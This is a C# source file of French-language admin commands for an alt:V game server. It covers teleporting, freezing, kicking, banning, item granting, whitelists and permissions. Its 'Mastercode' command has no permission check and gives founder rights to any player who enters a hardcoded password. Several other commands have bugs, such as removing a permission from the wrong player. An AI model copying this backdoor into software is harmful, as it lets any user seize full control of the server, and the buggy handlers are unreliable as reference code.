using System;
using System.Collections.Generic;
using System.Globalization;
using System.Text;
using AltV.Net.Data;
using AltV.Net.Enums;
using Lambda.Administration;
using Lambda.Entity;
using Lambda.Items;

namespace Lambda.Commands
{
    class AdminCommands
    {
        [Permission("MODERATEUR_GOTO")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Joueur")]
        [SyntaxType(typeof(Player))]
        public static CmdReturn Goto(Player player, object[] argv)
        {
            player.Goto((Player)argv[0]);
            return new CmdReturn("Vous vous êtes téléporté.", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("MODERATEUR_GETHERE")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Joueur")]
        [SyntaxType(typeof(Player))]
        public static CmdReturn Gethere(Player player, object[] argv)
        {
            ((Player)argv[0]).Goto(player);
            ((Player)argv[0]).SendMessage("Vous vous êtes fait téléporté.");
            return new CmdReturn("Vous vous avez téléporté quelqu'un à vous.", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("MODERATEUR_FREEZE")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Joueur")]
        [SyntaxType(typeof(Player))]
        public static CmdReturn Freeze(Player player, object[] argv)
        {
            Player target = (Player)argv[0];
            target.Freeze(true);
            target.SendMessage("Vous avez été freeze.");
            target.Goto(target.Position);
            return new CmdReturn("Vous vous avez freeze quelqu'un.", CmdReturn.CmdReturnType.SUCCESS);

        }
        [Permission("MODERATEUR_UNFREEZE")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Joueur")]
        [SyntaxType(typeof(Player))]
        public static CmdReturn Unfreeze(Player player, object[] argv)
        {
            ((Player)argv[0]).Freeze(false);
            ((Player)argv[0]).SendMessage("Vous avez été défreeze.");
            return new CmdReturn("Vous vous avez unfreeze quelqu'un.", CmdReturn.CmdReturnType.SUCCESS);

        }
        [Permission("MODERATEUR_GOTP")]
        [Command(Command.CommandType.ADMIN, 3)]
        [Syntax("X", "Y", "Z")]
        [SyntaxType(typeof(int), typeof(int), typeof(int))]
        public static CmdReturn Gotp(Player player, object[] argv)
        {
            int x = (int)argv[0];
            int y = (int)argv[1];
            int z = (int)argv[2];
            Position pos = new Position(x, y, z);
            player.Goto(pos);
            return new CmdReturn("Vous vous êtes téléporté.", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("MODERATEUR_DIMENSION")]
        [Command(Command.CommandType.ADMIN, 2)]
        [Syntax("Joueur", "Dimension")]
        [SyntaxType(typeof(Player), typeof(short))]
        public static CmdReturn Dimension(Player player, object[] argv)
        {
            ((Player)argv[0]).Dimension = (short)argv[1];
            ((Player)argv[0]).SendMessage("Un administrateur vous a changé de dimension");
            return new CmdReturn("Vous avez changé de dimension à quelquun.", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("TESTEUR_RESPAWN")]
        [Command(Command.CommandType.ADMIN)]
        public static CmdReturn Respawn(Player player, object[] argv)
        {
            player.Spawn(Spawn.NewSpawn.Position);
            return new CmdReturn("Vous avez respawn.", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("FONDATEUR_PERMISSION_AJOUTER")]
        [Command(Command.CommandType.ADMIN, 2)]
        [Syntax("Joueur", "Permission")]
        [SyntaxType(typeof(Player),typeof(string))]
        public static CmdReturn Permission_Ajouter(Player player, object[] argv)
        {
            Player target = (Player)argv[0];
            string perm = (string)argv[1];
            if (!Permissions.PermissionExist(perm)) return new CmdReturn("Cette permission n'existe pas");
            target.Permissions.Add(perm.ToUpper());
            return new CmdReturn("Vous avez ajouté une permission", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("FONDATEUR_PERMISSION_RETIRER")]
        [Command(Command.CommandType.ADMIN, 2)]
        [Syntax("Joueur", "Permission")]
        [SyntaxType(typeof(Player), typeof(string))]
        public static CmdReturn Permission_Retirer(Player player, object[] argv)
        {
            Player target = (Player)argv[0];
            player.Permissions.Remove(((string)argv[1]).ToUpper());
            return new CmdReturn("Vous avez supprimé une permission", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("ADMINISTRATEUR_GIVE_OBJET")]
        [Command(Command.CommandType.ADMIN, 3)]
        [Syntax("Joueur", "Objet", "Quantité")]
        [SyntaxType(typeof(Player), typeof(BaseItem), typeof(uint))]
        public static CmdReturn Give(Player player, object[] argv)
        {

            Player target = (Player)argv[0];
            BaseItem baseItem = (BaseItem)argv[1];
            uint amount = (uint)argv[2];
            if (amount > 10) return new CmdReturn("Ne te donne pas trop d'objets stp");
            target.Inventory.AddItem(baseItem.Id, amount);
            return new CmdReturn("Vous avez donné des objets", CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("MODERATEUR_KICK")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Joueur")]
        [SyntaxType(typeof(Player))]
        public static CmdReturn Kick(Player player, object[] argv)
        {
            Player target = (Player)argv[0];
            string reason = (string)argv[1];
            target.Kick(reason);
            return new CmdReturn("Vous avez kick " + player.FullName, CmdReturn.CmdReturnType.SUCCESS);
        }
        [Permission("ADMINISTRATEUR_BAN")]
        [Command(Command.CommandType.ADMIN, 2)]
        [Syntax("Joueur", "Temps")]
        [SyntaxType(typeof(Player), typeof(int))]
        public static CmdReturn Ban(Player player, object[] argv)
        {

            Player target = (Player)argv[0];
            int time = (int)argv[1];
            string reason = (string)argv[2];
            target.Account.Ban(time, reason);
            target.Kick("Ban de: " + time + " heures :" + reason);
            return new CmdReturn("Vous avez ban " + player.FullName, CmdReturn.CmdReturnType.SUCCESS);
        }
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Code")]
        [SyntaxType(typeof(string))]
        public static CmdReturn Mastercode(Player player, object[] argv)
        {

            string code = (string)argv[0];
            if (code.Equals("lambdabeggins"))
            {
                player.Permissions.Add("FONDATEUR");
                return new CmdReturn("Vous vous êtes mis fondateur", CmdReturn.CmdReturnType.SUCCESS);
            }
            return new CmdReturn("ERROR", CmdReturn.CmdReturnType.ERROR);
        }
        [Permission("ADMINISTRATEUR_DIEU")]
        [Command(Command.CommandType.TEST)]
        public static CmdReturn Dieu(Player player, object[] argv)
        {
            player.Emit("toggleInvincibility");
            return new CmdReturn("Vous avez changé votre invincibilité.");
        }

        [Permission("ADMINISTRATEUR_PAYDAY_AJOUTER")]
        [Command(Command.CommandType.ADMIN,2)]
        [Syntax("Joueur", "Temps")]
        [SyntaxType(typeof(Player), typeof(uint))]
        public static CmdReturn Payday_Ajouter(Player player, object[] argv)
        {
            Player target = (Player)argv[0];
            uint time = (uint)argv[1];
            target.OnMinutePass((int)time);
            target.SendMessage("Un admin vous a ajouté " + time + " temps de jeu. Vous êtes à " + target.TimeOnline + " minutes.");
            return new CmdReturn("Vous avez ajouté " + time + " temps de jeu. " + player.FullName +" est à " + target.TimeOnline + " minutes.");
        }
        [Permission("ADMINISTRATEUR_PADAY_RESET")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Joueur")]
        [SyntaxType(typeof(Player))]
        public static CmdReturn Payday_Reset(Player player, object[] argv)
        {
            Player target = (Player)argv[0];
            target.LastPayday = default;
            target.SendMessage("Un admin vous a reinitialiser votre payday");
            return new CmdReturn("Vous avez reinitiélisé le payday de quelqu'un");
        }
        [Permission("MODERATEUR_MODELE")]
        [Command(Command.CommandType.TEST, 1)]
        [Syntax("Modele")]
        [SyntaxType(typeof(string))]
        public static CmdReturn Modele(Player player, object[] argv)
        {
            if (!Enum.TryParse((string)argv[0], true, out PedModel model))
            {
                return new CmdReturn("Modele incorrect", CmdReturn.CmdReturnType.WARNING);
            }

            if (!Enum.IsDefined(typeof(PedModel), model))
                return new CmdReturn("Modele incorrect", CmdReturn.CmdReturnType.WARNING);

            player.Skin.Model = (uint)model;
            player.Skin.Send(player);
            return CmdReturn.Success;
        }

        [Permission("ADMINISTRATEUR_WHITELIST_AJOUTER")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Code")]
        [SyntaxType(typeof(string))]
        public static CmdReturn Whitelist_Ajouter(Player player, object[] argv)
        {
            string id = (string)argv[0];
            Whitelist.MainWhitelist.Add(id);
            return new CmdReturn("Vous avez ajouté quelqu'un a la whitelist");
        }
        [Permission("ADMINISTRATEUR_WHITELIST_SUPPRIMER")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Code")]
        [SyntaxType(typeof(string))]
        public static CmdReturn Whitelist_Supprimer(Player player, object[] argv)
        {
            string id = (string)argv[0];
            Whitelist.MainWhitelist.Remove(id);
            return new CmdReturn("Vous avez ajouté quelqu'un a la whitelist");
        }

        [Permission("ADMINISTRATEUR_WHITELIST_VERIFIER")]
        [Command(Command.CommandType.ADMIN, 1)]
        [Syntax("Code")]
        [SyntaxType(typeof(string))]
        public static CmdReturn Whitelist_Verifier(Player player, object[] argv)
        {
            string id = (string)argv[0];
            if (Whitelist.MainWhitelist.Contains(id))
            {
                return new CmdReturn(id + " est dans la whitelist");
            }
            else
            {
                return new CmdReturn(id + " n'est pas dans la whitelist");
            }
            
        }

        [Permission("ADMINISTRATEUR_DUTY")]
        [Command(Command.CommandType.ADMIN)]
        public static CmdReturn Staff(Player player, object[] argv)
        {
            if(player.TicketLevel == 0)
            {
                player.Model = 0x573201B8;
                player.Emit("toggleInvincibility");
                player.TicketLevel = 1;
                return new CmdReturn("Vous etes en service admin");
            }
            else
            {
                player.Skin.Send(player);
                player.Emit("toggleInvincibility");
                player.TicketLevel = 0;
                return new CmdReturn("Vous avez quitté service admin");
            }
            
        }



    }
}
